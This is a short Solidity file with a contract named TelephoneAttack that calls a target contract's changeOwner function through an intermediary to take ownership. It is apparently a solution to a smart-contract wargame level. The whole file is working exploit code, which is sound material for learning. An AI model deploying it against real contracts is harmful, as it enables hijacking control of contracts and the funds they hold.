//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone itelephone;

    constructor(address _telephoneContractAddress) {
        itelephone = ITelephone(_telephoneContractAddress);
    }
    
    function attack(address _newOwner) external {
        itelephone.changeOwner(_newOwner);
    }
}